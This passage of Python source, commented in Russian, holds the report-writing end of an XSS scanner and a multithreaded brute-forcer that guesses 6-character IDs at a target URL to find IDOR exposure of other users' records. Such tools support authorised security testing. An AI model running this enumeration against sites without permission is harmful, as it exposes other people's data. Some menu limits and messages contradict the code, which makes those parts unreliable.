            ]

            #создание таблицы с данными
            table_data = []
            for row in info_data:
                table_row = []
                for cell in row:
                    table_row.append(Paragraph(str(cell), table_style))
                table_data.append(table_row)

            info_table = Table(table_data, colWidths=[200, 300])
            info_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#3498DB')),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                ('FONTNAME', (0, 0), (-1, 0), font_name if fonts_setup else 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, 0), 12),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor('#EBF5FB')),
                ('GRID', (0, 0), (-1, -1), 1, colors.HexColor('#D6EAF8'))
            ]))
            story.append(info_table)
            story.append(Spacer(1, 20))

            #Результаты сканирования
            story.append(Paragraph("Результаты сканирования", heading_style))
            story.append(Paragraph(f"Найдено уязвимостей: {len(self.vulnerabilities)}", subheading_style))

            if self.vulnerabilities:
                for i, vuln in enumerate(self.vulnerabilities, 1):
                    story.append(Paragraph(f"Уязвимость #{i}: {vuln['type']}", subheading_style))
                    vuln_data = [
                        ['Параметр', 'Значение'],
                        ['Тип', vuln['type']],
                        ['Уверенность', vuln.get('confidence', 'Неизвестно')],
                        ['Метод', vuln.get('method', 'N/A')],
                        ['Код ответа', str(vuln.get('response_code', 'N/A'))],
                        ['Описание', vuln.get('description', 'Нет')],
                        ['Пейлоад', vuln.get('payload', 'N/A')[:100]],
                        ['Время обнаружения', vuln.get('timestamp', 'N/A')]
                    ]
                    if 'url' in vuln:
                         vuln_data.append(['URL', vuln['url']])
                    if 'parameter' in vuln:
                         vuln_data.append(['Параметр', vuln['parameter']])
                    if 'vulnerable_field' in vuln:
                         vuln_data.append(['Поле формы', vuln['vulnerable_field']])
                    if 'form_action' in vuln:
                         vuln_data.append(['Действие формы', vuln['form_action']])
                    if 'recommendation' in vuln:
                         vuln_data.append(['Рекомендация', vuln['recommendation']])

                    #Создаем таблицу для уязвимости
                    vuln_table_data = []
                    for row in vuln_data:
                        table_row = []
                        for cell in row:
                            table_row.append(Paragraph(str(cell), table_style))
                        vuln_table_data.append(table_row)

                    vuln_table = Table(vuln_table_data, colWidths=[150, 350])
                    #Цвет в зависимости от уверенности
                    if vuln.get('confidence') == 'High':
                        header_color = colors.HexColor('#E74C3C')
                        row_color = colors.HexColor('#FDEDEC')
                    elif vuln.get('confidence') == 'Medium':
                        header_color = colors.HexColor('#F39C12')
                        row_color = colors.HexColor('#FEF5E7')
                    else:
                        header_color = colors.HexColor('#3498DB')
                        row_color = colors.HexColor('#EBF5FB')

                    vuln_table.setStyle(TableStyle([
                        ('BACKGROUND', (0, 0), (-1, 0), header_color),
                        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                        ('FONTNAME', (0, 0), (-1, 0), font_name if fonts_setup else 'Helvetica-Bold'),
                        ('BACKGROUND', (0, 1), (-1, -1), row_color),
                        ('GRID', (0, 0), (-1, -1), 1, colors.HexColor('#E5E7E9')),
                        ('ROWBACKGROUNDS', (0, 1), (-1, -1), [colors.white, row_color])
                    ]))
                    story.append(vuln_table)
                    story.append(Spacer(1, 12))
            else:
                 story.append(Paragraph("Уязвимости не обнаружены.", normal_style))

            story.append(Spacer(1, 12))

            #Рекомендации по безопасности
            story.append(PageBreak())
            story.append(Paragraph("Рекомендации по устранению XSS уязвимостей", heading_style))
            story.append(Spacer(1, 12))

            story.append(Paragraph("1. ДЛЯ REFLECTED XSS:", subheading_style))
            recommendations = [
                "Всегда экранируйте пользовательский ввод перед выводом на страницу",
                "Валидируйте входные данные (белые списки лучше черных)",
                "Кодируйте специальные символы: <, >, \", ', &",
                "Используйте Content Security Policy (CSP) для ограничения выполнения JS"
            ]
            for rec in recommendations:
                story.append(Paragraph(rec, normal_style))
            story.append(Spacer(1, 12))

            story.append(Paragraph("2. ДЛЯ DOM-BASED XSS:", subheading_style))
            recommendations = [
                "Используйте textContent вместо innerHTML",
                "Используйте Content Security Policy (CSP)",
                "Регулярно обновляйте JavaScript библиотеки",
                "Валидируйте и экранируйте данные из недоверенных источников (URL, localStorage и т.д.)"
            ]
            for rec in recommendations:
                story.append(Paragraph(rec, normal_style))
            story.append(Spacer(1, 12))

            story.append(Paragraph("3. ДЛЯ STORED XSS:", subheading_style))
            recommendations = [
                "Экранируйте данные при сохранении И при выводе",
                "Ограничивайте длину и тип вводимых данных",
                "Реализуйте moderation для пользовательского контента",
                "Шифруйте чувствительные данные при хранении"
            ]
            for rec in recommendations:
                story.append(Paragraph(rec, normal_style))
            story.append(Spacer(1, 12))

            story.append(Paragraph("4. ОБЩИЕ МЕРЫ:", subheading_style))
            recommendations = [
                "Используйте X-XSS-Protection заголовки",
                "Регулярно проводите тестирование на проникновение",
                "Обучайте разработчиков принципам безопасного программирования",
                "Внедряйте практики SAST/DAST в процесс CI/CD"
            ]
            for rec in recommendations:
                story.append(Paragraph(rec, normal_style))

            story.append(Spacer(1, 20))

            #Заключение
            story.append(Paragraph("Заключение", heading_style))
            story.append(Paragraph(
                "Данный отчет содержит результаты автоматизированного аудита безопасности "
                "на предмет уязвимостей типа XSS (Cross-Site Scripting). "
                "Найденные уязвимости требуют внимательного рассмотрения и устранения.",
                normal_style
            ))

            story.append(Spacer(1, 20))

            #PDF отчёт
            doc.build(story)
            print(f"PDF отчет успешно создан: {filename}")
            if not fonts_setup:
                print("Внимание: Русский текст может отображаться некорректно в PDF")
                print("Для правильного отображения установите шрифты с поддержкой кириллицы")

        except Exception as e:
            print(f"Ошибка создания PDF отчета: {e}")
            import traceback
            traceback.print_exc()
            #текстовый отчет как запасной вариант
            self.generate_text_report(filename.replace('.pdf', '.txt'))

    def generate_text_report(self, filename="xss_report.txt"):
        """Генерирует текстовый отчет в стиле IDOR отчета"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"xss_report_{self.base_domain}_{timestamp}.txt"

        duration = time.time() - self.stats['start_time']
        report_lines = []
        report_lines.append("Отчет об аудите XSS уязвимостей")
        report_lines.append(f"Цель: {self.target_url}")
        report_lines.append(f"Домен: {self.base_domain}")
        report_lines.append(f"Дата сканирования: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report_lines.append(f"Общее время: {duration:.2f} секунд")
        report_lines.append(f"Загружено XSS векторов: {len(self.xss_payloads)}")
        report_lines.append(f"Отправлено HTTP запросов: {self.stats['requests_sent']}")
        report_lines.append(f"Проверено страниц: {self.stats['pages_scanned']}")
        report_lines.append(f"Найдено форм: {self.stats['forms_found']}")
        report_lines.append(f"Протестировано параметров: {self.stats['parameters_tested']}")
        report_lines.append(f"Найдено уязвимостей: {len(self.vulnerabilities)}")
        report_lines.append("")
        report_lines.append("Статистика сканирования")
        report_lines.append(f"Время сканирования: {duration:.2f} секунд")
        report_lines.append(f"Запросов: {self.stats['requests_sent']}")
        report_lines.append(f"Страниц: {self.stats['pages_scanned']}")
        report_lines.append(f"Форм: {self.stats['forms_found']}")
        report_lines.append(f"Параметров: {self.stats['parameters_tested']}")
        report_lines.append(f"Уязвимостей: {self.stats['vulnerabilities_found']}")
        report_lines.append(f"Reflected XSS: {self.stats['reflected_xss']}")
        report_lines.append(f"DOM-based XSS (потенц.): {self.stats['dom_xss_potential']}")
        report_lines.append(f"Stored XSS (потенц.): {self.stats['stored_xss_potential']}")
        report_lines.append("")

        if self.vulnerabilities:
            report_lines.append("Найденные уязвимости XSS")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                report_lines.append(f"{i}. {vuln['type']}")
                report_lines.append(f"   Уверенность: {vuln.get('confidence', 'Неизвестно')}")
                report_lines.append(f"   Метод: {vuln.get('method', 'N/A')}")
                report_lines.append(f"   Код ответа: {vuln.get('response_code', 'N/A')}")
                report_lines.append(f"   Описание: {vuln.get('description', 'Нет описания')}")
                report_lines.append(f"   Пейлоад: {vuln.get('payload', 'N/A')}")
                report_lines.append(f"   Время: {vuln.get('timestamp', 'N/A')}")

                if 'url' in vuln:
                     report_lines.append(f"   URL: {vuln['url']}")
                if 'parameter' in vuln:
                     report_lines.append(f"   Параметр: {vuln['parameter']}")
                if 'vulnerable_field' in vuln:
                     report_lines.append(f"   Поле формы: {vuln['vulnerable_field']}")
                if 'form_action' in vuln:
                     report_lines.append(f"   Действие формы: {vuln['form_action']}")
                if 'recommendation' in vuln:
                     report_lines.append(f"   Рекомендация: {vuln.get('recommendation', 'Нет рекомендации')}")
                report_lines.append("")
        else:
            report_lines.append("Уязвимости не найдены")
            report_lines.append("")

        report_lines.append("Рекомендации по устранению XSS")
        report_lines.append("1. ДЛЯ REFLECTED XSS:")
        report_lines.append("   - Валидируйте входные данные")
        report_lines.append("   - Кодируйте специальные символы")
        report_lines.append("   - Используйте CSP")
        report_lines.append("")
        report_lines.append("2. ДЛЯ DOM-BASED XSS:")
        report_lines.append("   - Обновляйте JS библиотеки")
        report_lines.append("")
        report_lines.append("3. ДЛЯ STORED XSS:")
        report_lines.append("   - Экранируйте данные при сохранении и выводе")
        report_lines.append("   - Ограничивайте вводимые данные")
        report_lines.append("")
        report_lines.append("4. ОБЩИЕ МЕРЫ:")
        report_lines.append("   - Используйте X-XSS-Protection заголовки")
        report_lines.append("   - Регулярно тестируйте приложение")
        report_lines.append("   - Обучайте разработчиков")
        report_lines.append("")


        report_lines.append("Конец отчета")


        with open(filename, 'w', encoding='utf-8') as f:
            f.write('\n'.join(report_lines))

        print(f"\nТекстовый отчет сохранен в файл: {filename}")

    def generate_xss_report(self, filename=None):
        """Генерация отчета по XSS сканированию (обновленный метод)"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"xss_audit_{self.base_domain}_{timestamp}"

        print(f"\nГенерация отчетов")
        #Текстовый отчет
        txt_report = f"{filename}.txt"
        self.generate_text_report(txt_report)
        print(f"Текстовый отчет: {txt_report}")

        #PDF отчет
        if PDF_SUPPORT:
            try:
                pdf_report = f"{filename}.pdf"
                self.generate_pdf_report(pdf_report)
                print(f"PDF отчет: {pdf_report}")
            except Exception as e:
                print(f"Ошибка создания PDF: {e}")
        else:
            print("PDF отчет не создан (reportlab не установлен)")

        return txt_report

def main():
    """Основная функция для запуска XSS-сканера"""
    parser = argparse.ArgumentParser(description='XSS-сканер')
    parser.add_argument('url', help='URL сайта для XSS сканирования')
    parser.add_argument('--threads', type=int, default=10,
                        help='Количество потоков (по умолчанию: 10)')
    parser.add_argument('--cookies', type=str,
                        help='Cookies для авторизации: "name1=value1; name2=value2"')
    parser.add_argument('--output', type=str,
                        help='Имя файла для отчета (без расширения)')
    parser.add_argument('--fast', action='store_true',
                        help='Быстрое сканирование (меньше тестов)')
    args = parser.parse_args()

    #Проверка URL
    if not args.url.startswith(('http://', 'https://')):
        print("Укажите полный URL")
        return

    #Парсинг cookies
    cookies_dict = {}
    if args.cookies:
        for cookie in args.cookies.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                cookies_dict[name] = value

    scanner = XSSAuditor(
        target_url=args.url,
        max_threads=args.threads,
        cookies=cookies_dict)

    try:
        if args.fast:
            print("Запуск быстрого сканирования")
            scanner.xss_payloads = scanner.xss_payloads[:20]
        print("Начало XSS сканирования")
        vulnerabilities = scanner.full_xss_scan()
        if args.output:
            scanner.generate_xss_report(args.output)
        else:
            scanner.generate_xss_report()
    except KeyboardInterrupt:
        print("Сканирование прервано пользователем")
    except Exception as e:
        print(f"Критическая ошибка: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()

import requests
import re
import sys
import time
import json
import argparse
import itertools
import string
import random
import math
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import os


#Установка библиотек для создания отчетов
def check_reportlab():
    """Проверяет наличие reportlab, устанавливает если нет"""
    try:
        from reportlab.lib.pagesizes import A4
        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
        from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
        from reportlab.lib import colors
        from reportlab.pdfbase import pdfmetrics
        from reportlab.pdfbase.ttfonts import TTFont
        return True
    except ImportError:
        print("Библиотека 'reportlab' не установлена")
        print("Пытаюсь установить")
        try:
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install", "reportlab"])
            print("Установка успешна")
            return True
        except:
            print("Не удалось установить reportlab")
            print("Установите вручную: pip install reportlab")
            return False


#Проверка
if not check_reportlab():
    print("Будут создаваться только текстовые отчеты")

from reportlab.lib.pagesizes import A4
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib import colors
from reportlab.lib.enums import TA_CENTER, TA_LEFT
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont


class SimpleIDORBruteforceScanner:
    def __init__(self, target_url, max_threads=50, cookies=None, headers=None):
        """target_url (str): Целевой URL для сканирования
        max_threads (int): Максимальное количество потоков
        cookies (dict): Куки для аутентификации
        headers (dict): Заголовки HTTP """
        self.target_url = target_url.rstrip('/')
        parsed_url = urlparse(target_url)
        self.base_domain = parsed_url.netloc
        self.scheme = parsed_url.scheme or 'http'
        self.max_threads = max_threads
        self.session = requests.Session()

        #Настройка сессии
        if cookies:
            self.session.cookies.update(cookies)

        default_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive'}

        if headers:
            default_headers.update(headers)
        self.session.headers.update(default_headers)

        #Результаты сканирования
        self.vulnerabilities = []

        #Статистика
        self.stats = {
            'requests_sent': 0,
            'vulnerabilities_found': 0,
            'combinations_tested': 0,
            'start_time': time.time(),
            'total_combinations': 0}

        #Алфавит для генерации комбинаций
        self.alphabet = string.ascii_letters + string.digits  # a-z, A-Z, 0-9
        print(f"Алфавит содержит {len(self.alphabet)} символов")
        print(f"Всего возможных комбинаций из 6 символов: {len(self.alphabet) ** 6:,}")

        #Ключевые слова для определения успешного доступа
        self.success_keywords = [
            'user', 'profile', 'account', 'email', 'phone', 'address',
            'name', 'data', 'info', 'details', 'settings', 'password',
            'dashboard', 'panel', 'admin', 'administrator', 'welcome',
            'персональные данные', 'личный кабинет', 'профиль', 'аккаунт']

        #Ключевые слова для определения ошибок
        self.error_keywords = [
            '404', 'not found', 'error', 'page not found',
            'does not exist', 'invalid', 'forbidden', 'unauthorized',
            'ошибка 404', 'страница не найдена', 'доступ запрещен']

    def scan(self):
        """Основной метод сканирования"""
        print(f"Начало сканирования IDOR: {self.target_url}")
        print(f"Максимальное количество потоков: {self.max_threads}")

        try:
            #Получить базовый путь для брутфорса
            print("Определение базового пути для брутфорса")
            base_url = self._get_base_url_for_bruteforce()
            print(f"Базовый URL для брутфорса: {base_url}")

            #Рассчитать общее количество комбинаций
            print("Расчет общего количества комбинаций")
            total_combinations = len(self.alphabet) ** 6
            self.stats['total_combinations'] = total_combinations
            print(f"Всего возможных комбинаций: {total_combinations:,}")
            print(f"Полный перебор займет много времени")

            #Генерация и тестирование комбинаций
            print("Этап 3: Генерация и тестирование комбинаций")

            strategy = self._ask_scan_strategy()

            if strategy == 'random_small':
                self._bruteforce_random(base_url, sample_size=1000)
            elif strategy == 'random_medium':
                self._bruteforce_random(base_url, sample_size=10000)
            elif strategy == 'random_large':
                self._bruteforce_random(base_url, sample_size=50000)
            elif strategy == 'patterns':
                self._bruteforce_patterns(base_url)
            elif strategy == 'incremental':
                self._bruteforce_incremental(base_url, limit=500000)
            elif strategy == 'custom':
                self._bruteforce_custom(base_url)

        except KeyboardInterrupt:
            print("\n\n Сканирование прервано пользователем")
        except Exception as e:
            print(f"Ошибка при сканировании: {e}")
            import traceback
            traceback.print_exc()

        self._print_statistics()

        return self.vulnerabilities

    def _ask_scan_strategy(self):
        """Спросить пользователя о стратегии сканирования"""
        print("Выберите стратегию сканирования:")
        print("1.Случайная выборка (1,000 комбинаций) - быстро")
        print("2.Случайная выборка (10,000 комбинаций) - средне")
        print("3.Случайная выборка (50,000 комбинаций) - медленно")
        print("4.Перебор по паттернам")
        print("5.Последовательный перебор (первые 10,000)")
        print("6.Ввести количество комбинаций вручную")
        while True:
            try:
                choice=input("\nВаш выбор (1-6): ").strip()

                if choice == '1':
                    return 'random_small'
                elif choice == '2':
                    return 'random_medium'
                elif choice == '3':
                    return 'random_large'
                elif choice == '4':
                    return 'patterns'
                elif choice == '5':
                    return 'incremental'
                elif choice == '6':
                    return 'custom'
                else:
                    print("Пожалуйста, выберите от 1 до 6")
            except KeyboardInterrupt:
                raise

    def _get_base_url_for_bruteforce(self):
        """Определение базового URL для брутфорса"""
        parsed = urlparse(self.target_url)
        path = parsed.path

        if not path or path == '/':
            #Если путь корневой, использовать его
            return f"{self.scheme}://{self.base_domain}/"

        #разбиение пути на части
        parts = [p for p in path.strip('/').split('/') if p]
        if not parts:
            return f"{self.scheme}://{self.base_domain}/"

        #Содержит ли последняя часть цифры или похожа на ID
        last_part = parts[-1]

        #Если последняя часть похожа на ID нужно удалить её
        if (last_part.isdigit() or
                re.match(r'^[a-f0-9]{32}$', last_part, re.I) or
                re.match(r'^[a-f0-9]{8}-[a-f0-9]{4}-', last_part, re.I) or
                len(last_part) <= 10 and re.match(r'^[a-zA-Z0-9]+$', last_part)):

            #Удаление последней части (предпологая что это ID)
            base_path = '/' + '/'.join(parts[:-1])
            if base_path == '':
                base_path = '/'
            else:
                base_path += '/'
            return f"{self.scheme}://{self.base_domain}{base_path}"
        else:
            #полный путь с добавлением /
            if not path.endswith('/'):
                path += '/'
            return f"{self.scheme}://{self.base_domain}{path}"

    def _generate_random_combinations(self, count):
        """Генерация случайных комбинаций"""
        combinations = set()

        print(f"Генерация {count} случайных комбинаций")

        while len(combinations) < count:
            #Генерация случайной комбинации из 6 символов
            combo = ''.join(random.choices(self.alphabet, k=6))
            combinations.add(combo)

            #рогресс каждые 1000 комбинаций
            if len(combinations) % 1000 == 0:
                print(f"Сгенерировано: {len(combinations)}/{count}")

        return list(combinations)

    def _generate_pattern_combinations(self):
        """Генерация комбинаций по паттернам"""
        combinations = set()

        print("Генерация умных комбинаций по паттернам")

        #Числовые комбинации
        print("Числовые паттерны")
        numeric_patterns = [
            '000000', '000001', '000010', '000100', '001000', '010000', '100000',
            '111111', '222222','333333', '444444', '555555', '666666', '777777', '888888', '999999',
            '123456', '654321', '123123', '321321', '101010', '010101',
            '000111', '111000', '222333','333222',
        ]
        combinations.update(numeric_patterns)

        #Буквенные комбинации
        print("Буквенные паттерны")
        letter_patterns = [
            'aaaaaa','AAAAAA', 'bbbbbb', 'BBBBBB', 'cccccc', 'CCCCCC',
            'abcdef', 'ABCDEF', 'fedcba', 'FEDCBA',
            'abc123', 'ABC123', '123abc','123ABC',
        ]
        combinations.update(letter_patterns)

        #Комбинации на основе слов
        print("Комбинации на основе слов")
        words = ['admin', 'user', 'test', 'guest', 'demo', 'root', 'super', 'system']
        for word in words:
            #дополнение слова до 6 символов
            if len(word) < 6:
                #добавление нулей
                padded_zero = word + '0' * (6 - len(word))
                combinations.add(padded_zero)
                combinations.add(padded_zero.upper())

                #Добавление единицы
                padded_one = word + '1' * (6 - len(word))
                combinations.add(padded_one)
                combinations.add(padded_one.upper())

            #Добавление цифр в конце
            for i in range(10):
                if len(word) <= 5:
                    combo = word + str(i) * (6 - len(word))
                    combinations.add(combo)
                    combinations.add(combo.upper())

        #Популярные идентификаторы
        print("Популярные идентификаторы")
        popular = [
            'user01', 'user02', 'user03', 'user04', 'user05',
            'admin1', 'admin2', 'admin3', 'admin4', 'admin5',
            'test01', 'test02', 'test03', 'test04', 'test05',
            'guest1', 'guest2', 'guest3', 'guest4', 'guest5',
            'demo01', 'demo02', 'demo03', 'demo04', 'demo05',
        ]
        combinations.update(popular)

        #Случайные комбинации
        print("Добавление случайных комбинаций")
        random_combos = self._generate_random_combinations(1000)
        combinations.update(random_combos)
        return list(combinations)

    def _generate_incremental_combinations(self, limit=10000):
        """Генерация последовательных комбинаций"""
        combinations = []

        print(f"Генерация первых {limit} последовательных комбинаций")

        #Генерация комбинации по порядку
        for i in range(min(limit, len(self.alphabet) ** 6)):
            combo = self._index_to_combo(i)
            if combo:
                combinations.append(combo)

            #прогресс
            if i % 1000 == 0 and i > 0:
                print(f"Сгенерировано: {i}/{limit}")

        return combinations

    def _index_to_combo(self, index):
        """Преобразование индекса в комбинацию"""
        if index >= len(self.alphabet) ** 6:
            return None

        combo = []
        temp = index
        for _ in range(6):
            temp, remainder = divmod(temp, len(self.alphabet))
            combo.append(self.alphabet[remainder])

        return ''.join(reversed(combo))

    def _bruteforce_random(self, base_url, sample_size):
        """Случайный брутфорс"""
        combinations = self._generate_random_combinations(sample_size)
        print(f"Начинаем тестирование {len(combinations)} случайных комбинаций")
        self._test_combinations(base_url, combinations)

    def _bruteforce_patterns(self, base_url):
        """Брутфорс по паттернам"""
        combinations = self._generate_pattern_combinations()
        print(f"Начинаем тестирование {len(combinations)} комбинаций по паттернам")
        self._test_combinations(base_url, combinations)

    def _bruteforce_incremental(self, base_url, limit):
        """Последовательный брутфорс"""
        combinations = self._generate_incremental_combinations(limit)
        print(f"Начинаем тестирование {len(combinations)} последовательных комбинаций")
        self._test_combinations(base_url, combinations)

    def _bruteforce_custom(self, base_url):
        """Кастомный брутфорс"""
        while True:
            try:
                count = int(input("Введите количество комбинаций для тестирования (1-500000): "))
                if 1 <= count <= 500000:
                    break
                print("Пожалуйста, введите число от 1 до 100000")
            except ValueError:
                print("Пожалуйста, введите число")
            except KeyboardInterrupt:
                raise

        method = input("Выберите метод генерации (1=случайные, 2=последовательные): ").strip()

        if method == '2':
            combinations = self._generate_incremental_combinations(count)
        else:
            combinations = self._generate_random_combinations(count)

        print(f"Начинаем тестирование {len(combinations)} комбинаций")
        self._test_combinations(base_url, combinations)

    def _test_combinations(self, base_url, combinations):
        """Тестирование комбинаций"""
        total = len(combinations)
        print(f"Всего комбинаций для тестирования: {total}")

        #многопоточность
        with ThreadPoolExecutor(max_workers=min(self.max_threads, total)) as executor:
            futures = {}
            batch_size = 100

            #Разбивание на батчи для лучшего отображения прогресса
            for i in range(0, total, batch_size):
                batch = combinations[i:i + batch_size]

                #Создание задач для батча
                for combo in batch:
                    test_url = f"{base_url}{combo}"
                    future = executor.submit(self._test_single_url, test_url, combo)
                    futures[future] = (test_url, combo)

                #завершение батча
                completed_in_batch = 0
                for future in as_completed(list(futures.keys())):
                    self._process_future_result(future, futures[future])
                    del futures[future]
                    completed_in_batch += 1

                #прогресс
                tested_so_far = i + len(batch)
                print(f"Прогресс: {tested_so_far}/{total} ({tested_so_far / total * 100:.1f}%)")

    def _test_single_url(self, url, combo):
        """Тестирование одного URL"""
        try:
            self.stats['requests_sent'] += 1

            #Отправление запроса
            response = self.session.get(
                url,
                timeout=5,
                allow_redirects=False,
                headers={'X-Requested-With': 'XMLHttpRequest'}
            )

            return {
                'url': url,
                'combo': combo,
                'status_code': response.status_code,
                'content_length': len(response.text),
                'text': response.text[:1000],
                'headers': dict(response.headers)
            }

        except requests.exceptions.Timeout:
            return {
                'url': url,
                'combo': combo,
                'status_code': 'timeout',
                'error': 'Timeout'
            }
        except requests.exceptions.ConnectionError:
            return {
                'url': url,
                'combo': combo,
                'status_code': 'connection_error',
                'error': 'Connection Error'
            }
        except Exception as e:
            return {
                'url': url,
                'combo': combo,
                'status_code': 'error',
                'error': str(e)
            }

    def _process_future_result(self, future, url_info):
        """Обработка результата выполнения задачи"""
        test_url, combo = url_info

        try:
            result = future.result(timeout=10)
            self.stats['combinations_tested'] += 1

            #является ли ответ уязвимостью
            if self._is_vulnerable_response(result):
                vulnerability = {
                    'url': test_url,
                    'combo': combo,
                    'status_code': result.get('status_code'),
                    'content_length': result.get('content_length', 0),
                    'type': 'Bruteforced IDOR',
                    'confidence': 'High',
                    'evidence': self._get_vulnerability_evidence(result),
                    'discovery_method': '6-char bruteforce',
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

                self.vulnerabilities.append(vulnerability)
                self.stats['vulnerabilities_found'] += 1

                print(f"\nНайдена уязвимость IDOR")
                print(f"Комбинация: {combo}")
                print(f"Статус код: {result.get('status_code')}")
                print(f"Длина контента: {result.get('content_length')}")

        except Exception as e:
            pass

    def _is_vulnerable_response(self, result):
        """Определение, является ли ответ уязвимостью"""
        if 'error' in result or result.get('status_code') in ['timeout', 'connection_error', 'error']:
            return False

        status_code = result.get('status_code')

        #Пропуск ошибок
        if status_code in [404, 403, 500, 401, 400]:
            return False

        #Пропуск на ошибки
        if status_code in [301, 302, 303, 307, 308]:
            location = result.get('headers', {}).get('location', '').lower()
            if any(err in location for err in ['error', '404', 'login', 'auth', 'signin']):
                return False

        #Проверка длины контента
        content_length = result.get('content_length', 0)
        if content_length < 50:  # Слишком короткий ответ
            return False

        #Проверка текста на ошибки
        text = result.get('text', '').lower()
        for error_keyword in self.error_keywords:
            if error_keyword in text:
                return False

        # Проверяем на успешный доступ (наличие данных)
        for success_keyword in self.success_keywords:
            if success_keyword in text:
                return True

        #Если статус 200 и достаточно длинный контент
        if status_code == 200 and content_length > 200:
            #Не является ли это стандартной страницей
            if not self._is_default_page(text):
                return True

        return False

    def _is_default_page(self, text):
        """Проверка, является ли страница стандартной"""
        text_lower = text.lower()

        #Проверяем стандартные заголовки/футеры
        default_indicators = [
            'welcome to nginx', 'apache', 'index of /',
            'test page for', 'default page', 'it works',
            'thank you for using', 'powered by', 'under construction'
        ]

        for indicator in default_indicators:
            if indicator in text_lower:
                return True

        #Проверяем слишком простой HTML
        if text_lower.count('<') < 5 and text_lower.count('>') < 5:
            return True

        return False

    def _get_vulnerability_evidence(self, result):
        """Получение доказательств уязвимости"""
        evidence = []

        if result.get('status_code'):
            evidence.append(f"Статус: {result['status_code']}")

        if result.get('content_length'):
            evidence.append(f"Длина: {result['content_length']} символов")

        # Ищем ключевые слова в тексте
        text = result.get('text', '').lower()
        found_keywords = []

        for keyword in self.success_keywords:
            if keyword in text:
                found_keywords.append(keyword)
                if len(found_keywords) >= 3:
                    break

        if found_keywords:
            evidence.append(f"Ключевые слова: {', '.join(found_keywords[:3])}")

        return '; '.join(evidence)

    def _print_statistics(self):
        """Вывод статистики сканирования"""
        duration = time.time() - self.stats['start_time']

        print("Статистика сканирования IDOR")
        print(f"Общее время: {duration:.2f} секунд")
        print(f"Скорость: {self.stats['requests_sent'] / max(duration, 1):.1f} запросов/сек")
        print(f"Отправлено запросов: {self.stats['requests_sent']}")
        print(f"Протестировано комбинаций: {self.stats['combinations_tested']}")
        print(f"Найдено уязвимостей: {self.stats['vulnerabilities_found']}")

        if self.stats['total_combinations'] > 0:
            percentage = (self.stats['combinations_tested'] / self.stats['total_combinations']) * 100
            print(f"Покрытие комбинаций: {percentage:.10f}%")

        print("-" * 60)

        if self.vulnerabilities:
            print("Найденные уязвимости:")
            for i, vuln in enumerate(self.vulnerabilities[:10], 1):
                print(f"{i}. {vuln['url']}")
                print(f"Комбинация: {vuln['combo']}")
                print(f"Уверенность: {vuln['confidence']}")
        else:
            print("Уязвимости не найдены")


    def _setup_russian_fonts(self):
        """Настройка русских шрифтов для PDF"""
        try:
            #Попытка использовать стандартный шрифт с поддержкой кириллицы
            pdfmetrics.registerFont(TTFont('DejaVu', 'DejaVuSans.ttf'))
            return True
        except:
            try:
                #Альтернатива
                font_paths = [
                    '/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf',
                    '/usr/share/fonts/truetype/freefont/FreeSans.ttf',
                    'C:\\Windows\\Fonts\\arial.ttf',
                    'C:\\Windows\\Fonts\\times.ttf',
                    '/System/Library/Fonts/Helvetica.ttc',
                    '/Library/Fonts/Arial.ttf'
                ]

                for font_path in font_paths:
                    if os.path.exists(font_path):
                        pdfmetrics.registerFont(TTFont('RussianFont', font_path))
                        return True

                # Если не нашли шрифты, используем встроенные
                print("Не удалось найти русские шрифты, используем стандартные")
                return False
            except:
                return False

    def generate_pdf_report(self, filename="idor_report.pdf"):
        """Генерирует PDF отчет с поддержкой русского языка"""
        print(f"\nГенерация PDF отчета: {filename}")

        try:
            #Настройка русских шрифтов
            fonts_setup = self._setup_russian_fonts()

            #документ
            doc = SimpleDocTemplate(
                filename,
                pagesize=A4,
                rightMargin=72,
                leftMargin=72,
                topMargin=72,
                bottomMargin=72
            )

            #Стили с учетом русского языка
            styles = getSampleStyleSheet()

            #имя шрифта для использования
            font_name = 'RussianFont' if fonts_setup else 'Helvetica'

            #Кастомные стили с русским шрифтом
            title_style = ParagraphStyle(
                'CustomTitle',
                parent=styles['Heading1'],
                fontName=font_name,
                fontSize=16,
                spaceAfter=30,
                alignment=TA_CENTER,
                textColor=colors.HexColor('#2C3E50')
            )

            heading_style = ParagraphStyle(
                'CustomHeading',
                parent=styles['Heading2'],
                fontName=font_name,
                fontSize=14,
                spaceAfter=12,
                spaceBefore=12,
                textColor=colors.HexColor('#2980B9')
            )

            subheading_style = ParagraphStyle(
                'SubHeading',
                parent=styles['Heading3'],
                fontName=font_name,
                fontSize=12,
                spaceAfter=6,
                spaceBefore=6,
                textColor=colors.HexColor('#34495E')
            )

            #Стиль для обычного текста
            normal_style = ParagraphStyle(
                'NormalRussian',
                parent=styles['Normal'],
